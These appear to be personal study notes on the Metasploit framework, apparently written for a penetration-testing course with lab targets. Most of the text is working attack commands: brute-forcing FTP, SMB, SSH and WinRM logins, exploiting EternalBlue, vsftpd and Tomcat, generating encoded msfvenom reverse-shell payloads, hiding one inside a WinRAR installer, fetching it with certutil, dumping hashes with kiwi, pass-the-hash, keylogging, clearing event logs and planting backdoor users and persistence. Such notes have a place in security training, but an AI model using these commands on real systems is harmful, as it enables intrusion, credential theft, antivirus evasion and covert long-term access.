#msf
## Metasploit fondamentals

MSF = automation pentest tool

PTES (Penetration Testing Execution Standard) = Methodology


PTES Roadmap x MSF tools :
- Intel gathering - Auxiliary module
- Enumeration - Exploit Modules & payloads
- Vulnerability scanning - Auxiliary module / Nessus
- Exploitation - Meterpreter
- Post Exploitation
	- Privesc - Post exploitation modules / Meterpreter
	- Persistance - Post exploitation modules / Persistence
	- Clearing tracks

Setting up MSF

```bash

sudo systemctl enable postgresql
sudo systemctl start postgresql
sudo systemctl status postgresql
sudo msfdb
sudo msfdb init

#or
sudo msfdb reinit

sudo msfd status

msfconsole
db_status


```

Fundamentals of using msf

what to know :
- How to
	- search modules
	- select module
	- configure module options / variables - variable can be local or global
	- manage sessions
	- use additional functionality
	- save conf


```bash

msfconsole
version

show all
show exploits

search portscan
use 0
#or 
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.168.2.1
#or global
set RHOSTS 192.168.2.1
show options
set PORTS 1-500
run
#or 
exploit

back

search cve:2017 type:exploit platform:windows
search eternalblue

set payload windows/meterpreter/x64/reverse_tcp

sessions

#equivalent of nc
connect -h
connect 192.168.2.1 80


```

manage workspace 

```bash

msfconsole
db_status

workspace -h
workspace

workspace -a test
workspace
workspace default
hosts #show historique of hosts victime set

workspace -a INE
workspace -d test

workspace -r INE PTA

```


## Informations gathering / enumeration

#### Nmap

basic scan
```bash

#default
nmap 10.4.22.173

#skip host health check and do direct for port scanning
#some firewall block the host check (ping probes)
nmap -Pn 10.4.22.173 

#services versions
nmap -Pn -sV 10.4.22.173 

#output for msf -> xml output
nmap -Pn -sV 10.4.22.173 -oX victim
```

Import the scan
```bash

systemctl start postgresql
#or 
service postgresql start

msfconsole
db_status

workspace -a victim-entreprise
db_import ~/victim
hosts #should show the name of victime 
services #the services enumerated with nmap

#initate nmap scan from msf
workspace -a nmaptest
db_nmap -Pn -sV -O 10.4.22.173 
#store auto into msf
hosts
services
vulns #nothing for now


```

#### Enumeration

###### Portscanning

port scan using msf auxiliary modules
auxiliary module purpose : scanning, discovery, fuzzing

why use auxiliary for portscanning
- being similar to nmap at the beginning
- time to shine in post exploitation phase
	- ex : scan target through compromise victim1 (useful for pivoting)
	- no need to import tool to the victim

```bash

service postgresql start
msfconsole
db_status
workspace -a portscan
workspace

search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.86.140.3
run

#port 80 open
curl 192.86.140.3

#run xoda
search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS 192.86.140.3 
set TARGETURI /
exploit

#meterpreter session
#victim 1
sysinfo
shell
/bin/bash -i
ifconfig
#victim 1 has a second interface : 192.113.124.2
#victim 2 is in this subnet (victime 2 is 192.113.124.3)
CTRL-C
run autoroute -s 192.113.124.2 #can provide sunbnet range or one system on the network
#this use the session on the victim, complete our routing table

background #or CTRL - Z
sessions

search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.113.124.3
run
#scan victim 2

back
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.86.140.3
run

set RHOSTS 192.113.124.3
run

```

###### FTP

File Transfer Protocol : facilitate file sharing between a server and client/client
port : 21
also use to for transfer file from/to web server

attacks :
- can enumerate infos
- bruteforce 

auth is done by username / password
or anonymously

Demo enumeration ftp
```bash

service postgresql start
msfconsole
db_status
workspace -a ftpenum

search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.51.147.3
run
#port 21 open

search ftp
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.113.124.3
run
#ProFTPD 1.3.5a

search proftpd
#just for the exemple / not in exploitation phase

search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.113.124.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit

search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.113.124.3
run

ftp 192.113.124.3
sysadmin
password
ls
get flag.txt

```


###### SMB

port : 445 (or 139 on NetBIOS for retrocompatibility)
file and peripherals sharing on LAN

Attasks :
- enumerate infos like : version, shares, users 
- bruteforce

demo enumeration smb
```bash

service postgresql start
msfconsole
db_status
workspace -a smb_enum

setg RHOSTS 192.91.46.3
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
run
#get the version : Samba 4.3.11-ubuntu

search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumusers

info
show options
run
#list of users

search type:auxiliary name:smb
use auxiliary/smb/smb_enumshares
set ShowFiles true
run

search smb_login
use auxiliary/scanner/smb/smb_login
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
#got password

exit
smbclient -L \\\\192.91.46.3\\ -U admin
password
smbclient \\\\192.91.46.3\\public -U admin
password
ls
get flag

```


###### Web Server

```bash

msfconsole
workspace -a webserv

setg RHOSTS 192.140.160.3
search http
search type:auxiliary name:http

use auxiliary/scanner/http/http_version
run
#apache 2.4.18 Ubuntu

search http_header
use auxiliary/scanner/http/http_header
run

search robots_txt
use auxiliary/scanner/http/robots_txt
#/data
#/secure

curl http://192.91.46.3/data
curl http://192.91.46.3/secure
#401 unauth

search dir_scanner
use auxiliary/scanner/http/dir_scanner
run

search files_dir
use auxiliary/scanner/http/files_dir
run

search http_login
use auxiliary/scanner/http/http_login
set AUTH_URI /secure/
unset USERPASS_FILE
run
set USER_FILE /usr/share/metasploit-framework/data/wordlits/namelist.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlits/unix_passwords.txt
set verbose false
run

search apache_userdir_enum
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
#found an user

search http_login
use auxiliary/scanner/http/http_login
echo "rooty" > user.txt
set USER_PASS ~/user.txt
run

```

###### MySQL

port:3306

```bash

msfconsole
workspace -a mysql_enum
setg RHOSTS 192.143.6.3
#confirm it s on port 3306
search portscan auxiliary/scanner/portscan/tcp
run

search type:auxiliary name:mysql
use /auxiliary/scanner/mysql/mysql_version
run
#MySQL 5.5.61 Ubuntu

search mysql_login
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set verbose false
#got password

search mysql_enum
use auxiliary/admin/mysql/mysql_enum #admin folder means need creds
set PASSWORD password
set USERNAME root
run

search mysql_sql
use auxiliary/admin/mysql/mysql_sql
set PASSWORD password
set USERNAME root
set SQL show databases;#type commands here
run
set SQL use database;#type commands here
run

use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD password
run

hosts
services
loot
creds

exit
mysql -h 192.143.6.3 -u root -p
password
#session
show databases;
use database1;
show tables;
select * from table1;

```

###### SSH

```bash

msfconsole
workspace -a sshenum
setg RHOSTS 192.30.120.3
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_version
run

use auxiliary/scanner/ssh/ssh_login
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set verbose false
run
#got creds and open sessions
sessions
sessions 1
#open shell
/bin/bash -i
exit

use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run


```

###### SMTP

port:25 by default or 465/587 for encryption

```bash

msfconsole
workspace -a smtpenum
setg RHOSTS 192.108.85.3
#dont forget to check if it s defaut port with portscan
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_version
run

use auxiliary/scnaner/smtp/smtp_enum
run

```

## Vulnerability scanning

#### MSF

 ```bash

msfconsole

workspace -a ms3

setg RHOSTS 10.10.10.4
db_nmap -sS -sV -O 10.10.10.4
hosts
services

search type:exploit name:Microsoft IIS
search type:exploit name:msql 5.5
search type:exploit name:glassfish

use exploit/multi/glassfish_deployer
info

#open new tab kali
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"

#back to msf
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
run
#vulnerable

use exploit/windows/smb/ms17_010_eternalblue
run
#meterpreter session

#next technique
#plugin metasploit-autopwn
#github code
#after download
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins

#back to msf
load db_autopwn
db_autopwn
db_autopwn -p -t -PI 445 

analyze
vulns
services


```

#### Nessus

proprietary vuln scanner
free version up to 16 ips

```bash

systemctl start nessusd.service
#then go to local web url

#do the scan then chose export option > nessus > save in xml format
#to import in msf
msfconsole
workspace -a nessusimport
db_import ~/scan.nessus
hosts
services
vulns
vulns -p 445

search cve:2017 name:smb


```

#### Web Apps - WMAP

web app vulns scanner
integrated module to msf

```bash

msfconsole
setg RHOSTS 192.157.89.3
load wmap
wmap_
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3/

wmap_sites -l
wmap_targets -l

#load the modules
wmap_run -t
wmap_run -e

wmap_vulns -l

```

## Client-Side attacks

Client-Side attacks = attack vector involving forcing client to execute malicious payload on their system to connect back to attacker
take advantage of human
involve transfer / storage of malicious payload on client disk, need to know if AV present

for ex : 
- if target = server : should search for vuln exploit
- if target = client/end user device : should more opt for a client side attack

#### Payloads

###### Msfvenom - generate

msfvenom = tool to generate generate/encode MSF paylaods for various OS/Web server
- can be used to generate malicious meterpreter paylaod to then be transferred to client target.
- once executed, will connect back to our payload handler and provide remote access

pre-pack with kali

2 type of payload :
- staged :
	- payload send in 2 part
- stageless :
	- non staged or inline payload, payload send with the exploit as a all

generate paylaod

```bash

msfvenom
#give indo and option

msfvenom --list paylaods

#syntax of staged payload
#OS/architecture/payload type/protocole you want to connect back
#ex: windows/x64/meterpreter/reverse_tcp
#or: linux/x86/meterpreter/reverse_tcp

#syntax of non staged payload
#windows/x64/meterpreter_reverse_tcp
#linux/x86/meterpreter_reverse_tcp

#syntax to create a payload
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/payloadx86.exe

msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/payloadx64.exe

#list of formats
msfvenom --list formats

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST:10.10.10.5 LPORT=1234 -f elf > ~/linuxpayloadx86
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST:10.10.10.5 LPORT=1234 -f elf > ~/linuxpayloadx64

#exemple
#set up web server to publish paylaods
sudo python -m SimpleHTTPSServer 80

#open new tab
#gonna use le multi handler of msf because need appropriate listener for meterpreter payload
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234 
run

#head to windows 7 sustem
internet explorer
http://10.10.10.5
downlaod payload
execute the payload

#back in msf
#meterpreter session open


```

###### Msfvenom - encode

most of AV use signature based detection to identify malicious files/executables
signature = hash file
encode consist of modifying the payload shellcode to change it's signature

shellcode is piece of code used in payload for exploitation

we encode several time a payload (iterations)

```bash

msfvenom --list encoder
#the encoder will depend on the arch and platform victim

#generate
#without adding the -a option, default is 32bits, more compatible
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/encodedx86.exe

#add iteration
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/encodedx86-2.exe

#linux 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/encodedx86linux


```

###### Msfvenom - injection paylaods into Windows PE

```bash

#choose a PE to inject
#for ex winrar

#download the winrar on kali
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Donwloads/wrar602.exe > winrar.exe

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run

#in windows, downlaod the payloads
execute
#meterpreter session open on kali but the exe do nothing on the windows
#to change the current process
#choose auto
run post/windows/manage/migrate

#to create a malicious file from real template and keeping it s functionnality use -k option
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Donwloads/wrar602.exe > winrar-new.exe
#got error : doesn t have any exports to inject into, maybe choose another PE




```

#### Automating

msf provide ressource scripts to automate repetitive tasks/commands
similar to batch script
load the scripts in msf
ex: setup multi handlers, loading and executing payloads

```bash

#to see default ressources scripts 
ls -la /usr/share/metasploit-framework/scritps/resource/
#check ex : 
vim /usr/share/metasploit-framework/scritps/resource/auto-brute.rc

#manual way
msfconsole
use multi/handler
set payloads windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run

#via script
vim handler.rc
use multi/handler
set PAYLOAD windows/merterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
#then save the file and quit
#to execute the script
msfconsole -r handler.rc


vim portscan.rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
:wq
msfconsole -r portscan

#now if already working in msf
#to load the scripts
msfconsole
resource ~/handler.rc

#if you did the step of conf a module you can export to rc script
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
makerc ~/portscan2.rc


```

## Exploitation

#### Windows exploitation

###### exploiting vulnerable HTTP file server

HTTP File server (HFS) just used for file/doc sharing
port 80 / http protocole
ex : rejetto HFS (windows and linux)
Rejetto HFS v2.3 vuln RCE -> msfmodule

```bash

service postgresql start
msfconsole
workspace -a hfsbreak

use auxiliary/scanner/portscan/tcp
setg RHOSTS 10.2.24.160
run
#or and better i think
db_nmap -sV -sS -Pn -O 10.2.24.160
#rejetto running on port 80, version 2.3

search typpe:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
#confirm the HFS running on /
#if ok, PATH is good
run
#meterpreter session
#close session

set payloads windows/x64/meterpreter/reverse_tcp
run
#meterpreter session

```
###### exploiting windows ms17-010 SMB eternalblue

```bash

msfconsole
workspace -a eternalblue
db_nmap -sS -sV -O 10.10.10.7
#running smb, OS is windows 7

search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.7
run
#likely vulnerable
search type:exploit name:name
use exploit/windows/smb/smb_ms17_010
set RHOSTS 10.10.10.7
show paylaods
run
#meterpreter session
sysinfo
getuid

```

###### exploiting winrm

port 5985 (http) /5986 (HTTPS)
windows remote management tool 

```bash

service postgresql start
msfconsole
workspace -a winrmbreak
setg RHOSTS 10.4.22.219

db_nmap -sS -sV -O -p- 10.4.22.219
#port 5985 open

search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods
#to set path go see the webpage : 10.4.22.219 or 10.4.22.219/wsman
run
#we can brute force

search winrm_login
use auxiliary/scanner/winrm/winrm_login

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
#get creds

search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD password
set CMD whoami

search winrm_script
use exploit/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD password
run
#error
set FORCE_VBS true
run
#meterpreter session
getuid
#auth/system



```

###### exploiting apache tomcat web server

Apache Tomcat / Tomcat server = free/open source java servlet web server
used to build/host website/webapp Java
port : 8080

apache = PHP
apache tomcat = Java

tomcat v8.5.19 -> RCE via JSP payload

```bash

service postgresql start
msfconsole
workspace -a tomcatbreak
setg RHOSTS 10.2.20.126

db_nmap -sS -sV -0 10.2.20.126
#windows, port 8080 : apache tomcat 8.5.19

search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
#check url on navigator

#need jsp payload
set paylaod java/jsp_shell_bind_tcp
set SHELL cmd #windows victim
run
#shell but not meterpreter
#sometimes need to be run serveral time
whoami
#auth/system
CTRL+Z
#to gain a meterpreter session, gonna use msfvenom payload, upload it via the current session shell we have and run it to build a better meterpreter shell

#new tab
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.4 LPORT=1234 -f exe > meterpreter.exe

#transfer
sudo python -m SimpleHTTPServer 80

#back in msf
session 1
certutil -urlcache -f http://10.10.5.4/meterpreter.exe meterpreter.exe

#third tab
#handler via a rcscript
vim handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.5.4
set LPORT 1234
run
:wq
msfconsole -r handler.rc

#back on target
.\meterpreter.exe

#meterpreter session

```

#### Linux exploitation

###### FTP Server

port 21
file sharing between server & client/client
also used to and from dir of web server
vsftpd V2.3.4 -> RCE

```bash

service postgresql start
msfconsole
workspace -a ftpbreak
setg RHOSTS 192.209..183.3
db_nmap -sS -sV -O -Pn --min-rate 1000 192.209.183.3
#vsftp 2.3.4

analyze
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
run
#root shell
/bin/bash -i
CTRL

search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set SESSION 1
run
sessions
sessions 2
#meterpreter shell
#root

```

###### Samba

Samba V3.5.0 -> RCE, can uplaod shared library (equivalent of dll) and execute it

```bash

service postgresql start
msfconsole
setg RHOSTS 192.18.76.3

db_nmap -sV -Pn --min-rate 1000 -O 192.18.76.3
#samba 3.X running

search type:exploit name:samba
use exploit/linux/samba/is_know_pipename
check
run
#shell session
CTRL+Z
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set SESSIONS 1
sessions
sessions 2
#meterpreter session


```

###### SSH

libSSH V0.6.0.8.0 (implementation of ssh)

```bash

service postgresql start
msfconsole
workspace -a sshbreak
setg RHOSTS 192.40.32.3
db_nmap -sV -Pn 192.40.32.3

search libshh_auth_bypass
use auxiliary/scanner/ssh/libshh_auth_bypass

set SPAWN_PTY true
run
sessions
sessions 1

```

###### SMTP

Haraka SMTP V2.8.9 -> RCE

```bash

service postgresql start
msfconsole
workspace -a smtpbreak
setg RHOSTS 192.86.51.3
db_nmap -sV -Pn --min-rate 1000 -O 192.86.51.3 
#haraka smtpd 2.8.8
search haraka
use exploit/linux/smtp/haraka
set SRVPOST 9898
set email_to lolox@gmail.com #must be valid
set payload linux/x64/meterpreter_reverse_http
show options
set LHOST eth1
run
#meterpreter session

```

#### Post exploitation fundamentals

###### Meterpreter

- meterpreter (meta interpreter) payload = multi-function payload that operate via DLL injection and is executed in memory on target
- allow to load script/plugin dynamically
- msf give various meterpreter in function of env & OS arch

```bash

service postgresql start
msfconsole
workspace -a meter
setg RHOSTS 192.86.51.3

db_nmap -sV 192.86.51.3
#apache and mysql
#gonna exploit the apache

curl http://192.86.51.3
#we see it s XODA server

search xoda
use exploit/unix/webapp/xoda_file_upload
set TARGETURI /
run
#meterpreter session

sysinfo
getuid
help #for list of commands

#in windows : keylogger, camera etc

background
sessions
sessions  -h
#run quick command
sessions -C sysinfo -i 1
sessions 1
background
sessions -n xoda_sesssion -i 1 #rename
sessions xoda_session

ls
pwd
cd ..
cat flag1.txt
edit flag1.txt
cd "if space on file name"
download flag1.txt

getenv PATH
getenv TERM
search -d /usr/bin -f *backdoor*
search -f *.php

#pop a shell
shell
/bin/bash -i #native linux

ps #list process
#to migrate process
migrate 580
migrate -N apache

execute -f ifconfig

upload ~/file.php


```

###### Upgrading commands shells to meterpreter shells

```bash

#context: simple shell on target after exploit
background
search shell_to_meterpreter
set use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST eth1
run
sessions 2

#another method, faster
session -u 1
sessions 3

```

#### Windows post exploitation

###### Windows PE modules

we can use module to :
- Enumerate :
	- user privs
	- logged on users
	- AVs
	- computer connected to domain
	- installed âtches
	- shares
	- installed programs
- Do VM check

```bash

service postgresql start && msfconsole
workspace -a windowsPE
setg RHOSTS 10.2.23.169
db_nmap -sV 10.2.23.169
#httpfile running
search rejetto
use exploit/http/rejetto_hfs_exec
run
#meterpreter session
sysinfo
#windows 2022 R2
help
getuid
#interesting commands
record_mic
webcam_snap
webcam_stream
keyscan_start
screenshot

getsystem #try auto privesc
getuid #auth/system
hashdump #failed
show_mount
ps
migrate -N explorer #or
migrate 2212

background
sessions

search migrate
use post/windows/manage/migrate
set SESSION 1
run

use post/windows/gather/win_privs
set SESSION 1
run

search enum_logged_on
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

search checkvm
use post/windows/gather/checkvm
set SESSION 1
run

search enum_applications
use post/windows/gather/enum_applications
set SESSION 1
run

loot

set type:post platform:windows enum_av
use post/windows/gather/enum_av_excluded
set SESSION 1
run #show if some folder is excluded in av

search enum_computer
use post/windows/gather/enum_computers
set SESSION 1
run

use post/windows/gather/enum_patches
set SESSION 1
run
#bug due to process
sessions 1
ps
migrate -N svchost
background
run
#if fail
sessions 1
shell
systeminfo
#give all installed patches

use post/windows/gather/enum_shares
set SESSION 1
run

search rdp platform:windows
use post/windows/manage/enable_rdp
set SESSION 1
run


```

###### Bypassing UAC

```bash

#context : already a meterpreter session but with an account 'admin' not a lot of rights
getprivs
getsystem #fail
net users
#check if user is admin group
net localgroup administrators
#we are

background
search bypassuac
use exploit/windows/local/bypassuac_injection
set SESSION 1
set LPORT 4433
run
#fail
set TARGET Windows\ x64
#open meterpreter shell
#no more rights + same user admin but this time UAC is bypass so getsystem we ll work
getsystem
getuid
hashdump

```



###### Token Impersonation w/ incognito

```bash

#meterpreter shell, not auth system
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
#actul process still are on the token of another user whereas we re adminitrator so need to migrate to a process of administrator
migrate 5533 #explorer
hashdump

```

###### Dumping hashes with mimikatz

Mimikatz msfmodule = kiwi

```bash

pgrep lsass
migrate 792

load kiwi
help

creds_all
lsa_dump_sam
lsa_dump_secret #syskey

```

###### Pass the hash with psexec

connect legitimetly
persistance 

```bash

pgrep lsass
migrate 788

hashdump
#adminstrator and student hash gotten
exit

search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.2.29.165
set SMBUser Administrator
set SMBPass <LMhash>:<NTLMhash>

```

###### Establishing persistance on windows

aim to keep access to systems across restart, changed creds, or other interruptions

```bash

search platform:windows persitence
#create a service to connect back
use exploit/windows/local/persitence_service
set paylaod widnows/meterpreter/reverse_tcp
set SERVICE_NAME discretname 
set SESSION 1
set LPORT 9999
run

session -K #kill all session
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 9999
run
#get back meterpreter session

```

###### Enabling RDP

disabled by default, can use msf moduleto enable it
auth need legitimate suer account + clear text password

```bash

search enable_rdp
use post/windows/manage/enable_rdp
set SESSION 1
exploit
db_nmap -sV -p3389 10.2.19.254
#open

#to change password in shell
shell
net user administrator hackerpassword

#new shell
xfreerdp /u:administrator /p:hackerpassword /v:10.2.19.254


```

###### Keylogging windows

meterpreter provide with ability to capture keystrokes and downlaod them back

```bash

#works better in explorer process
pgrep explorer
migrate 3212

keyscan_start
#key are tapped
keyscan_dump

```

###### Clearing event logs

all actons/event stored in windows event log
different cat
- application logs : app/program event
- system logs : reboot, startup event
- security logs : password change

```bash

shell
net user administrator password123!
#log is created

ctrl-c
#back to meterpreter
clearev
#erase all logs but let only one log : logs erased

```

###### Pivoting

exploit other system on the compromised one
meterpreter provide abilty to add network route ton internal subnet

```bash

service ostgresql start
msfconsole
workspace -a pivoting

db_nmap -sV 10.2.27.1

search hfs
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.2.27.1
exploit
#meter on victim 1

ipconfig

run autoroute -s 10.2.27.0/20
background
sessions -n victim1 -i 1

use auxiliary/scanner/portscan/tcp
set RHOSTS 10.2.27.187
#port 80 running
#can t accessible outside of msf -> in navigator no response in victime 2 port 80

sessions 1
portfwd add -l 1234 -p 80 -r 10.2.27.187

background
db_nmap -sV -p 1234 localhost
search badblue
use exploit/windows/http/badblue_passthru

set payload widnows/meterpreter/bind_tcp
set RHOSTS 10.2.27.187
set LPORT 4433
exploit

sessions -n victim2 -i 2
sessions victim2


```

#### Linux post exploitation

###### Linux PE modules

can enum :
- system conf
- env variables
- network conf
- user history 

intersting post module
- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec

```bash

sysinfo
getuid
#root

shell
/bin/bash -i

#see all users
cat /etc/passwd

groups root
cat /etc/*issue
uname -r
uname -a

ip a
netstat -antp
ps aux
env

CTRL+C
background

search enum_configs
use post/linux/gather/enum_configs
set SESSION 1
run

loot

search env platform:linux
use post/multi/gather/env
set SESSION 1
run

search enum_network
use post/linux/gather/enum_network
set SESSION 1
run

loot

search enum_protections
use post/linux/gather/enum_protections
#see if it s harden
set SESSION 1
run

notes

search enum_system
use post/linux/gather/enum_system
info
set SESSION 1
run

loot
search checkcontainer
use post/linux/gather/checkcontainer
set SESSION 1
run

search checkvm
use post/linux/gather/checkvm
set SESSION 1
run

search enum_user_history
use post/linux/gather/enum_user_history
set SESSION 1
run


```

###### Exploit vulnerable program

depend on kernel + distribution version

```bash

setg RHOSTS 192.114.219.3

search ssh_login
use auxiliary/scanner/ssh_login
set USERNAME jackie
set PASSWORD password
run

sessions
sessions -i 1
/bin/bash -i

#upgrade
CTRL+Z
sessions -u 1
sessions 2
shell
/bin/bash -i
cat /etc/passwd

ps aux
#root started a script : /bin/bash /bin/check-down
cat /bin/check-down

#script use chkrootkit

chkrootkit --help
chkrootkit -V
#version 0.49

CTRL+Z
background
search chkrootkit
use exploit/unix/local/chkrootkit
set SESSION 1
set CHKROOTKIT /bin/chkrootkit
set LHOST 192.124.219.2
set 
exploit

/bin/bash -i
whoami
#root

```

###### Linux hash dump

password hash -> /etc/shadow -> need root priv
hash can then be cracked with john the ripper

```bash

sysinfo
getuid
#root

CTRL+c
background

search hashdump
use post/linux/gather/hashdump
set SESSION 1
run

#save password file in your machine

```

###### Linux persistence

```bash

#with an root meterpreter shell

#create backdoor user
shell
/bin/bash -i
useradd -m ftp -s /bin/bash
passwd ftp
password
password
groups root
usermod -aG root ftp
groups ftp
#in root group
usermod -u 15 ftp #to make the user not last in /etc/passwd

CTRL+C
CTRL+Z

search platform:linux persistence
use exploit/linux/local/cron_persistence
set SESSION 1
set LPORT 4422
run

search platform:linux persistence
use exploit/linux/local/service_persistence
set SESSION 1
set payload cmd/unix/reverse_python
set LHOST 192.182.80.3
set LPORT 1234
set target 4
exploit

search platform:linux persistence
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true
set SESSION 1
exploit
loot #to get private key

#copy and past in key file
vim ssh_key
chmod 0400 ssh_key
ssh -i ssh_key root@192.182.80.3



```




## Armitage

#### MSF GUI

java based GUI
- Vizualize target
- automate port scanning
- automate exploitation
- automate post-explotation

already installed on kali